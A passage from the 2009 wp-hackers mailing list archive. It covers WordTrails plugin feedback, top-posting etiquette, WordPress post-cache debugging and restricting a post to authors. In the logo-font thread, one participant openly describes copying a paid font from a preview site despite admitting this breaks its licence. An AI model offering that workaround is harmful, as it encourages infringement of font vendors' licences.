Please let me know if you have any questions or feedback, or encounter
any bugs. Feel free to forward this email to any serious bloggers using
self-hosted WordPress. We've spent a year developing this plugin, and
are really eager to see what you guys do with it!

 

Jesse Silverstein

Jesse.Silverstein at xerox.com

 

On behalf of the Xerox Trails team

Xerox Research Center, Webster


From matt at sivel.net  Thu Oct  1 15:47:00 2009
From: matt at sivel.net (Matt Martz)
Date: Thu, 1 Oct 2009 11:47:00 -0400
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <1254411449.3235.2.camel@debian-desktop>
References: <a98aa881.1ca4280.9fead5c.491c@BrewerRadio.com>
	<1254411449.3235.2.camel@debian-desktop>
Message-ID: <20091001154700.GA637@worf.noc.sivel.net>

In case I was not clear before.  This message hereby concludes this
email thread.

</thread></conversation></endmeansendalready>
-- 
Matt Martz
matt at sivel.net
http://sivel.net/

From scribu at gmail.com  Thu Oct  1 16:09:29 2009
From: scribu at gmail.com (scribu)
Date: Thu, 1 Oct 2009 19:09:29 +0300
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>
Message-ID: <349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com>

It looks like a bug.

But why would you manually call update_post_caches?


On Thu, Oct 1, 2009 at 8:39 AM, William Canino <
william.canino at googlemail.com> wrote:

> WordPress wizards, would you have a look at this code:
>
> $my_query = new WP_Query(array('post__in' => array(1,2,3)));
> update_post_caches($my_query->posts);
> echo $get_permalink(1);
> echo $get_the_title(2);
>
> Do you know why WordPress is still making SQL queries on lines 3 and
> 4? Shouldn't they be already in the object cache?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From william.canino at googlemail.com  Thu Oct  1 16:47:22 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 1 Oct 2009 12:47:22 -0400
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com>
Message-ID: <e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>

I'm coding a Yet-Another-Clickable-List-of-Posts-With-Something-in-Common.
 The amount of SQL queries my current code is making is driving me
nuts.

2009/10/1 scribu <scribu at gmail.com>:
> It looks like a bug.
>
> But why would you manually call update_post_caches?
>
>
> On Thu, Oct 1, 2009 at 8:39 AM, William Canino <
> william.canino at googlemail.com> wrote:
>
>> WordPress wizards, would you have a look at this code:
>>
>> $my_query = new WP_Query(array('post__in' => array(1,2,3)));
>> update_post_caches($my_query->posts);
>> echo $get_permalink(1);
>> echo $get_the_title(2);
>>
>> Do you know why WordPress is still making SQL queries on lines 3 and
>> 4? Shouldn't they be already in the object cache?
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From batmoo at gmail.com  Thu Oct  1 17:09:04 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Thu, 1 Oct 2009 13:09:04 -0400
Subject: [wp-hackers] Repository of WordCamp Presentation Slides
Message-ID: <eaaa36c90910011009o5ac940cg1d35d3e8ba9c9133@mail.gmail.com>

I have yet to attend a WordCamp (I missed the Toronto one this year) and I'm
coming to realize that I'm missing out on a lot. I've found a lot of
presentation slides posted on site like SlideShare and while not as good as
seeing a presentation in person, it's better than nothing.

What I am wondering though is if there is a site or repository that has
links to all presentations from WordCamps that are available online. (A lot
of them are hosted on SlideShare but they're pretty scattered -- though you
still have to dig through a lot to find them). If not, I imagine it would be
pretty useful to have a repository of presentations, since there's a lot of
information there that could/should be centralized. Perhaps we can create
this on the Codex?

Thoughts?
Mo

--
Mohammad Jangda
www.digitalize.ca

From steph at sillybean.net  Thu Oct  1 18:18:23 2009
From: steph at sillybean.net (Stephanie Leary)
Date: Thu, 01 Oct 2009 18:18:23 +0000
Subject: [wp-hackers] Repository of WordCamp Presentation Slides
In-Reply-To: <eaaa36c90910011009o5ac940cg1d35d3e8ba9c9133@mail.gmail.com>
References: <eaaa36c90910011009o5ac940cg1d35d3e8ba9c9133@mail.gmail.com>
Message-ID: <d57415451ebfd9836112c974520336ed@laurel.joyent.us>


On Thu, 1 Oct 2009 13:09:04 -0400, Mohammad Jangda <batmoo at gmail.com>
wrote:
> What I am wondering though is if there is a site or repository that has
> links to all presentations from WordCamps that are available online. (A
lot
> of them are hosted on SlideShare but they're pretty scattered -- though
you
> still have to dig through a lot to find them). 

Quite a few of them are popping up on wordpress.tv:
http://wordpress.tv/category/wordcamptv/

It's by no means complete, though.


Stephanie Leary
sillybean.net

From william.canino at googlemail.com  Thu Oct  1 20:34:16 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 1 Oct 2009 16:34:16 -0400
Subject: [wp-hackers] Creating an "Author Cafe"
In-Reply-To: <op.u038vbqyspxmuu@dd32.no-ip.com>
References: <e4dc67e0909302220v59ebdbedyb650559a93ae3129@mail.gmail.com>
	<e4dc67e0909302232n711da91eu13f7dc7b5f635847@mail.gmail.com>
	<674b4a3b0910010250y132c9111r6df9ea32593bddc2@mail.gmail.com>
	<op.u038vbqyspxmuu@dd32.no-ip.com>
Message-ID: <e4dc67e0910011334o456b251fs70b2cc34b3bb6730@mail.gmail.com>

Thanks for the replies!  I've begun using the suggestions.

During testing, I am finding that many "recent comment" widgets and
dashboard widgets, such as the ones built in the core, do not check
whether its associated post or page is actually published and is not
private.

Meanwhile, the comments_array filter hook is only applied inside the
comments_template() function.

Has anybody looked at correcting this?

2009/10/1 Dion Hulse (dd32) <wordpress at dd32.id.au>:
> How about, instead of excluding, you include specifically?
>
> Create a new post, Set its post_status to 'private-author-cafe' or similar
> filter the WHERE clause if the current user is an editor or admin, of
> "($old_where) OR post_status == 'private-author-cafe'
>
> Seems like a possibility..
>
> On Thu, 01 Oct 2009 19:50:18 +1000, Austin Matzko <if.website at gmail.com>
> wrote:
>
>> On Thu, Oct 1, 2009 at 12:32 AM, William Canino
>> <william.canino at googlemail.com> wrote:
>>>
>>> I'm thinking of creating one post, comments enabled, say post_id =
>>> 100, that is visible only to authors and editors. ?This post mustn't
>>> appear in feeds or to non-authors, and its comments mustn't appear in
>>> the comments feed.
>>>
>>> All the plugins I've seen that offer to do this seem to use a WP_Query
>>> filter callback. It seems a big waste for the blog to scan each and
>>> every query post array and take out this one post for 99% of the
>>> world. ?Is there a better way? ?Do you have a better suggestion?
>>
>> You could use the posts_where filter, and append a WHERE clause to
>> every non-relevant query:
>>
>> " AND {$wpdb->posts}.ID != 100"
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
> --
> --
> Dion Hulse
> e: contact at dd32.id.au
> w: http://dd32.id.au/
> m: 04 6621 9112 (+614 6621 9112)
> WordPressQI: http://wordpressqi.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Thu Oct  1 20:58:27 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 1 Oct 2009 16:58:27 -0400
Subject: [wp-hackers] Creating an "Author Cafe"
In-Reply-To: <e4dc67e0910011334o456b251fs70b2cc34b3bb6730@mail.gmail.com>
References: <e4dc67e0909302220v59ebdbedyb650559a93ae3129@mail.gmail.com>
	<e4dc67e0909302232n711da91eu13f7dc7b5f635847@mail.gmail.com>
	<674b4a3b0910010250y132c9111r6df9ea32593bddc2@mail.gmail.com>
	<op.u038vbqyspxmuu@dd32.no-ip.com>
	<e4dc67e0910011334o456b251fs70b2cc34b3bb6730@mail.gmail.com>
Message-ID: <e4dc67e0910011358s2a3cd0dbv1e0e179fea747363@mail.gmail.com>

> Has anybody looked at correcting this?

Ah, I found them: trac tickets #9211 and #9144.

I will have to ban these two core widgets from my blog in the meantime.

Almost there, almost done.

2009/10/1 William Canino <william.canino at googlemail.com>:
> Thanks for the replies! ?I've begun using the suggestions.
>
> During testing, I am finding that many "recent comment" widgets and
> dashboard widgets, such as the ones built in the core, do not check
> whether its associated post or page is actually published and is not
> private.
>
> Meanwhile, the comments_array filter hook is only applied inside the
> comments_template() function.
>
> Has anybody looked at correcting this?
>
> 2009/10/1 Dion Hulse (dd32) <wordpress at dd32.id.au>:
>> How about, instead of excluding, you include specifically?
>>
>> Create a new post, Set its post_status to 'private-author-cafe' or similar
>> filter the WHERE clause if the current user is an editor or admin, of
>> "($old_where) OR post_status == 'private-author-cafe'
>>
>> Seems like a possibility..
>>
>> On Thu, 01 Oct 2009 19:50:18 +1000, Austin Matzko <if.website at gmail.com>
>> wrote:
>>
>>> On Thu, Oct 1, 2009 at 12:32 AM, William Canino
>>> <william.canino at googlemail.com> wrote:
>>>>
>>>> I'm thinking of creating one post, comments enabled, say post_id =
>>>> 100, that is visible only to authors and editors. ?This post mustn't
>>>> appear in feeds or to non-authors, and its comments mustn't appear in
>>>> the comments feed.
>>>>
>>>> All the plugins I've seen that offer to do this seem to use a WP_Query
>>>> filter callback. It seems a big waste for the blog to scan each and
>>>> every query post array and take out this one post for 99% of the
>>>> world. ?Is there a better way? ?Do you have a better suggestion?
>>>
>>> You could use the posts_where filter, and append a WHERE clause to
>>> every non-relevant query:
>>>
>>> " AND {$wpdb->posts}.ID != 100"
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>> --
>> --
>> Dion Hulse
>> e: contact at dd32.id.au
>> w: http://dd32.id.au/
>> m: 04 6621 9112 (+614 6621 9112)
>> WordPressQI: http://wordpressqi.com/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>

From william.canino at googlemail.com  Fri Oct  2 00:26:59 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 1 Oct 2009 20:26:59 -0400
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <42DF740CBF5256498541B6CA6DB6E56D04F30627@USA7061MS03.na.xerox.net>
References: <42DF740CBF5256498541B6CA6DB6E56D04F30627@USA7061MS03.na.xerox.net>
Message-ID: <e4dc67e0910011726q2a933ff1n240b0e8af9ce1956@mail.gmail.com>

Hi All,

WordTrails is basically a tool to create multiple multidirectional
reading paths within a blog.  The paths one creates are stored as XML,
which are re-read by the plugin to make a navigational sidebar widget
in HTML, or to display a flowchart in Flash.

The idea of telling a visitor, "To learn foobaring, just follow the
Foobar lesson, starting here, otherwise, move on to the next Barfoo
chapter" and "You're reading part 8 of our Foobar tutorial, you can
start at the beginning or look at the map," can potentially make this
a killer WP app, but the explicit need for a tutorial AND the explicit
need for instructions like "To read the next part, click the so-and-so
on the WordTrails box in the navigation column to the top right of
this post" make me wish I'd have made PowerPoint slides instead.

It becomes further overwhelming when there are several navigation
paths that overlap.

Don't get me wrong, Jesse, Navigational User Interfaces is a tough nut
to crack, but I think CBT tools do a better job at this than this.
I'd love to try this if ever it becomes XHTML compliant.

Best regards,
W


2009/10/1 Silverstein, Jesse <Jesse.Silverstein at xerox.com>:
> Hi WordPress community members:
>
>
>
> I am part of a team at the Xerox Innovation Group, and we've just
> released a powerful plugin called "WordTrails" in beta. ?I am emailing
> this group to solicit volunteers to help us test it a bit before we
> officially change the version number from 0.9.x to 1.0.
>
>
>
> WordTrails allows you to very easily blaze arbitrary paths (with
> branches and loops) through a WP blog. Readers can follow these trails
> through a "bird's eye view" Flash trailmap and a "worm's eye view"
> sidebar widget. They can also linearize and convert a trail to a PDF
> with one click.
>
>
>
> So WordTrails basically overlays a highly flexible navigation scheme on
> a WP blog, and simultaneously turns it into a sort of one-click ebook
> publishing system.
>
>
>
> I'd like to invite you to check out and install the plugin
> (http://wordpress.org/extend/plugins/wordtrails). You can see it in
> action at http://blog.trailmeme.com (click on the 'Trails' page). You
> can also try it out for yourself before installing, on our sandbox blog
> (open registration): http://blog.trailmeme.com/sandbox
>
>
>
> WordTrails is part of the ecosystem of a larger technology set called
> Xerox Trails, which includes a destination site at www.trailmeme.com
> <http://www.trailmeme.com/> ?that is currently in invite-only beta. For
> more background go to: http://blog.trailmeme.com/new-to-trails/
>
>
>
> Please let me know if you have any questions or feedback, or encounter
> any bugs. Feel free to forward this email to any serious bloggers using
> self-hosted WordPress. We've spent a year developing this plugin, and
> are really eager to see what you guys do with it!
>
>
>
> Jesse Silverstein
>
> Jesse.Silverstein at xerox.com
>
>
>
> On behalf of the Xerox Trails team
>
> Xerox Research Center, Webster
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Fri Oct  2 09:28:49 2009
From: scribu at gmail.com (scribu)
Date: Fri, 2 Oct 2009 09:28:49 +0000
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com>
	<e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>
Message-ID: <349fe48b0910020228p3e4a7daajb738005ef8e338f8@mail.gmail.com>

And in generating this list you require altering posts? You should be
using filters instead.

On 10/1/09, William Canino <william.canino at googlemail.com> wrote:
> I'm coding a Yet-Another-Clickable-List-of-Posts-With-Something-in-Common.
>  The amount of SQL queries my current code is making is driving me
> nuts.
>
> 2009/10/1 scribu <scribu at gmail.com>:
>> It looks like a bug.
>>
>> But why would you manually call update_post_caches?
>>
>>
>> On Thu, Oct 1, 2009 at 8:39 AM, William Canino <
>> william.canino at googlemail.com> wrote:
>>
>>> WordPress wizards, would you have a look at this code:
>>>
>>> $my_query = new WP_Query(array('post__in' => array(1,2,3)));
>>> update_post_caches($my_query->posts);
>>> echo $get_permalink(1);
>>> echo $get_the_title(2);
>>>
>>> Do you know why WordPress is still making SQL queries on lines 3 and
>>> 4? Shouldn't they be already in the object cache?
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> http://scribu.net
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
http://scribu.net

From info at toscho.de  Fri Oct  2 09:51:25 2009
From: info at toscho.de (Thomas Scholz)
Date: Fri, 02 Oct 2009 11:51:25 +0200
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <1254257208.6639.3.camel@debian-desktop>
References: <902424490909291339m11b4a17bte321b2492a30cf45@mail.gmail.com>
	<1254257208.6639.3.camel@debian-desktop>
Message-ID: <op.u052zzzvr6yny2@toscho.de>

Azhaguselvan:

> On Tue, 2009-09-29 at 13:39 -0700, Beau Lebens wrote:
>> Is there any particular reason we don't have many options in the Bulk
>> Actions SELECT box on the Edit Posts (or Pages) screens, or has it
>> just not really come up yet?
>
> May i know why most of you top-post?

May I know how this message answers Beau Leben's question?

Is it really so hard to start a separate thread?

Starting a discussion about etiquette in a hijacked thread ? am I the only  
one, who sees the irony?

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From azhaguselvan at gmx.com  Fri Oct  2 10:14:46 2009
From: azhaguselvan at gmx.com (Azhaguselvan)
Date: Fri, 02 Oct 2009 15:44:46 +0530
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <op.u052zzzvr6yny2@toscho.de>
References: <902424490909291339m11b4a17bte321b2492a30cf45@mail.gmail.com>
	<1254257208.6639.3.camel@debian-desktop> <op.u052zzzvr6yny2@toscho.de>
Message-ID: <1254478486.3233.2.camel@debian-desktop>

On Fri, 2009-10-02 at 11:51 +0200, Thomas Scholz wrote:
> Azhaguselvan:
> 
> > On Tue, 2009-09-29 at 13:39 -0700, Beau Lebens wrote:
> >> Is there any particular reason we don't have many options in the Bulk
> >> Actions SELECT box on the Edit Posts (or Pages) screens, or has it
> >> just not really come up yet?
> >
> > May i know why most of you top-post?
> 
> May I know how this message answers Beau Leben's question?
> 
> Is it really so hard to start a separate thread?
> 
> Starting a discussion about etiquette in a hijacked thread ? am I the only  
> one, who sees the irony?
> 
> Thomas
> 


My sincere apologies. I ll be careful and i won't hijack threads in
future. Somehow happened. 

I ll be happy if people do the same with Top-Posting.

Sorry guys. :(


Azhaguselvan,SP


From otto at ottodestruct.com  Fri Oct  2 13:34:18 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 2 Oct 2009 08:34:18 -0500
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from
	Xerox
In-Reply-To: <e4dc67e0910011726q2a933ff1n240b0e8af9ce1956@mail.gmail.com>
References: <42DF740CBF5256498541B6CA6DB6E56D04F30627@USA7061MS03.na.xerox.net>
	<e4dc67e0910011726q2a933ff1n240b0e8af9ce1956@mail.gmail.com>
Message-ID: <161617690910020634o2eeab24fi22751cdf17d4b4ad@mail.gmail.com>

It does look interesting, but I'm not sure that a flowchart is perhaps
the best way to do navigational systems. Neat idea though.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Fri Oct  2 13:49:06 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 2 Oct 2009 08:49:06 -0500
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com> 
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com> 
	<e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>
Message-ID: <161617690910020649l2ced8f39q291b11be08f94787@mail.gmail.com>

You shouldn't need to call update_post_caches, as the
WP_Query->query() function does that automatically anyway. query.php,
line 2359 (or thereabouts).

As for the rest, I don't know. The get_post function should indeed
check the cache first.

Call global $wp_object_cache; $wp_object_cache->stats(); to see the
contents of the cache before and after each call. Might help you with
debugging.

-Otto
Sent from Memphis, TN, United States


On Thu, Oct 1, 2009 at 11:47 AM, William Canino
<william.canino at googlemail.com> wrote:
> I'm coding a Yet-Another-Clickable-List-of-Posts-With-Something-in-Common.
> ?The amount of SQL queries my current code is making is driving me
> nuts.

From conorp_gr at hotmail.com  Fri Oct  2 15:28:22 2009
From: conorp_gr at hotmail.com (conorp_gr at hotmail.com)
Date: Sat, 03 Oct 2009 01:28:22 +1000
Subject: [wp-hackers] The WordPress Logo Font
Message-ID: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>

G'day guys,

I'm wondering why the WordPress logo uses the Mrs Eaves 
(http://en.wikipedia.org/wiki/Mrs_Eaves) font, considering it is a 
'premium' paid font, and is not under the GPL.  This particularly 
annoyed me today as I was trying to add text next to the WordPress Logo, 
(http://img.skitch.com/20091002-p49qc4as27hi4udwabf9xmu83u.jpg) and 
could not do so, since a different font looked out of place.

Thanks

Conorp

From john.ivar.myrstad at gmail.com  Fri Oct  2 15:57:44 2009
From: john.ivar.myrstad at gmail.com (John Myrstad)
Date: Fri, 2 Oct 2009 17:57:44 +0200
Subject: [wp-hackers] The WordPress Logo Font
In-Reply-To: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>
References: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>
Message-ID: <d29aad6e0910020857o4a3d1bfai9cb9555d69490181@mail.gmail.com>

Jason Santa Maria picked it when he designed the new logo.

John Myrstad

From william.canino at googlemail.com  Fri Oct  2 18:18:21 2009
From: william.canino at googlemail.com (William Canino)
Date: Fri, 2 Oct 2009 14:18:21 -0400
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <161617690910020649l2ced8f39q291b11be08f94787@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com>
	<e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com>
	<161617690910020649l2ced8f39q291b11be08f94787@mail.gmail.com>
Message-ID: <e4dc67e0910021118p1e12a929ke15432fc2512b06@mail.gmail.com>

Thank you for having a look.  I have isolated the issue. This code

function my_test_function() {
	global $wpdb, $wp_object_cache;
	$comments = $wpdb->get_results("Some query on wp_comments LIMIT 18"); 	
	if ( $comments ) : foreach ($comments as $comment) :		
		$post_in[] = $comment->post_ID;	
	endforeach; endif;	
	echo count($wp_object_cache->cache['posts'])."/".$wp_object_cache->cache_misses;
// Prints 21/68
	$my_query = new WP_Query(array('post__in' => $post_in));
	echo count($wp_object_cache->cache['posts'])."/".$wp_object_cache->cache_misses;
// Prints 27/88
	if ( $comments ) : foreach ($comments as $comment) :
		$title = get_the_title($comment->post_ID);
		$perma = get_permalink($comment->post_ID);
	endforeach; endif;
	echo count($wp_object_cache->cache['posts'])."/".$wp_object_cache->cache_misses;
// Prints 35/96
}

is producing the following $wpdb->queries dump. WordPress wizards, I
need help figuring out why 8 of the posts weren't cached. They are all
ordinary, published posts:

   [30] => Array
        (
            [0] =>  SELECT SQL_CALC_FOUND_ROWS  wp_posts.* FROM
wp_posts  WHERE 1=1  AND wp_posts.ID IN
(1704,1714,1724,1705,1730,470,67,1016,1714,1720,1701,1640,988,1727,1718,1726,1724,1704)
AND wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish'
OR wp_posts.post_status = 'private')  ORDER BY wp_posts.post_date DESC
LIMIT 0, 6
            [1] => 0.00011420249939
            [2] => require, require_once, include, my_test_function,
WP_Query->WP_Query, WP_Query->query, WP_Query->get_posts
        )

    [31] => Array
        (
            [0] => SELECT FOUND_ROWS()
            [1] => 6.00814819336E-5
            [2] => require, require_once, include, my_test_function,
WP_Query->WP_Query, WP_Query->query, WP_Query->get_posts
        )

    [32] => Array
        (
            [0] => SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t
INNER JOIN wp_term_taxonomy AS tt ON tt.term_id = t.term_id INNER JOIN
wp_term_relationships AS tr ON tr.term_taxonomy_id =
tt.term_taxonomy_id WHERE tt.taxonomy IN ('category', 'post_tag') AND
tr.object_id IN (1730, 1714, 1727, 1726, 1724, 1704) ORDER BY t.name
ASC
            [1] => 5.00679016113E-5
            [2] => require, require_once, include, my_test_function,
WP_Query->WP_Query, WP_Query->query, WP_Query->get_posts,
update_post_caches, update_object_term_cache, wp_get_object_terms
        )

    [33] => Array
        (
            [0] => SELECT post_id, meta_key, meta_value FROM
wp_postmeta WHERE post_id IN (1730,1714,1727,1726,1724,1704)
            [1] => 3.91006469727E-5
            [2] => require, require_once, include, my_test_function,
WP_Query->WP_Query, WP_Query->query, WP_Query->get_posts,
update_post_caches, update_postmeta_cache
        )

    [34] => Array
        (
            [0] => SELECT * FROM wp_posts WHERE ID = 1705 LIMIT 1
            [1] => 5.00679016113E-5
            [2] => require, require_once, include, my_test_function,
get_the_title, get_post
        )

    [35] => Array
        (
            [0] => SELECT * FROM wp_posts WHERE ID = 67 LIMIT 1
            [1] => 5.50746917725E-5
            [2] => require, require_once, include, my_test_function,
get_the_title, get_post
        )

followed by six others in the form of "SELECT * FROM wp_posts WHERE ID
= x LIMIT 1"

2009/10/2 Otto <otto at ottodestruct.com>:
> You shouldn't need to call update_post_caches, as the
> WP_Query->query() function does that automatically anyway. query.php,
> line 2359 (or thereabouts).
>
> As for the rest, I don't know. The get_post function should indeed
> check the cache first.
>
> Call global $wp_object_cache; $wp_object_cache->stats(); to see the
> contents of the cache before and after each call. Might help you with
> debugging.
>
> -Otto
> Sent from Memphis, TN, United States
>
>
> On Thu, Oct 1, 2009 at 11:47 AM, William Canino
> <william.canino at googlemail.com> wrote:
>> I'm coding a Yet-Another-Clickable-List-of-Posts-With-Something-in-Common.
>> ?The amount of SQL queries my current code is making is driving me
>> nuts.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jer at simianuprising.com  Fri Oct  2 18:22:07 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Fri, 2 Oct 2009 14:22:07 -0400
Subject: [wp-hackers] The WordPress Logo Font
In-Reply-To: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>
References: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>
Message-ID: <e1202cb10910021122g1d7bae86y4aa16e554519052f@mail.gmail.com>

On Fri, Oct 2, 2009 at 11:28 AM, conorp_gr at hotmail.com <
conorp_gr at hotmail.com> wrote:

> I'm wondering why the WordPress logo uses the Mrs Eaves (
> http://en.wikipedia.org/wiki/Mrs_Eaves) font, considering it is a
> 'premium' paid font, and is not under the GPL.  This particularly annoyed me
> today as I was trying to add text next to the WordPress Logo, (
> http://img.skitch.com/20091002-p49qc4as27hi4udwabf9xmu83u.jpg) and could
> not do so, since a different font looked out of place.
>

IMHO if you're doing something WP related it makes sense to have a different
font for your text than for the WP logo, that's what I do anyway. Take it as
a chance to distinguish your project from the WP core?

Obviously you could also just remove the old text and replace it with a
similar font that you have and use that for the other text, in that
situation I think the iconic logo will be much more important for
recognition than the exact original font.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | globalvoicesonline.org

From otto at ottodestruct.com  Fri Oct  2 20:46:55 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 2 Oct 2009 15:46:55 -0500
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
In-Reply-To: <e4dc67e0910021118p1e12a929ke15432fc2512b06@mail.gmail.com>
References: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com> 
	<349fe48b0910010909v3966d022s48ca50d0e882210c@mail.gmail.com> 
	<e4dc67e0910010947g3927f06dl92f16f522f784050@mail.gmail.com> 
	<161617690910020649l2ced8f39q291b11be08f94787@mail.gmail.com> 
	<e4dc67e0910021118p1e12a929ke15432fc2512b06@mail.gmail.com>
Message-ID: <161617690910021346j5ecc0409i5cfd1bd7ac384ca9@mail.gmail.com>

That's fine, but it still doesn't show the actual contents of the
cache. You're going to have to dump the cache before and after the
get_the_title call to see why it's missing.

-Otto
Sent from Memphis, TN, United States

From wordpress at dd32.id.au  Sat Oct  3 01:16:16 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sat, 03 Oct 2009 11:16:16 +1000
Subject: [wp-hackers] The WordPress Logo Font
In-Reply-To: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>
References: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>
Message-ID: <op.u069tcn4spxmuu@dd32.no-ip.com>

When i need half a dozen characters to fit in with a logo, I usually find  
a site as this, Which allows you to get a preview of text in a font:  
http://new.myfonts.com/fonts/emigre/mrs-eaves/

Then take that image, and then turn it into a vector (Last time i just  
used http://vectormagic.com/, It blew it up into a much higher res bitmap  
for me).

Whilst its against the license of the font, When its just to make a few  
alterations to a logo for your purposes and a substituted font doesn't  
look right, I figure, Someone has already payed for the font usage with  
this logo.. the logo should've come with the font included..

On Sat, 03 Oct 2009 01:28:22 +1000, conorp_gr at hotmail.com  
<conorp_gr at hotmail.com> wrote:

> G'day guys,
>
> I'm wondering why the WordPress logo uses the Mrs Eaves
> (http://en.wikipedia.org/wiki/Mrs_Eaves) font, considering it is a
> 'premium' paid font, and is not under the GPL.  This particularly
> annoyed me today as I was trying to add text next to the WordPress Logo,
> (http://img.skitch.com/20091002-p49qc4as27hi4udwabf9xmu83u.jpg) and
> could not do so, since a different font looked out of place.

-- 
--
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au/
m: 04 6621 9112 (+614 6621 9112)
WordPressQI: http://wordpressqi.com/

From lists at rotorised.com  Sat Oct  3 01:42:01 2009
From: lists at rotorised.com (Ryan McCue)
Date: Sat, 03 Oct 2009 11:42:01 +1000
Subject: [wp-hackers] The WordPress Logo Font
In-Reply-To: <op.u069tcn4spxmuu@dd32.no-ip.com>
References: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl>
	<op.u069tcn4spxmuu@dd32.no-ip.com>
Message-ID: <4AC6ABE9.1030303@rotorised.com>

Dion Hulse (dd32) wrote:
> Then take that image, and then turn it into a vector (Last time i just 
> used http://vectormagic.com/, It blew it up into a much higher res 
> bitmap for me).

Which is a proprietary, closed-source program. ;)

-- 
Ryan McCue
<http://ryanmccue.info/>


From lynne.pope at gmail.com  Sat Oct  3 02:28:36 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Sat, 3 Oct 2009 15:28:36 +1300
Subject: [wp-hackers] The WordPress Logo Font
In-Reply-To: <op.u069tcn4spxmuu@dd32.no-ip.com>
References: <BLU0-SMTP81C6C2753926729049A7D58AD20@phx.gbl> 
	<op.u069tcn4spxmuu@dd32.no-ip.com>
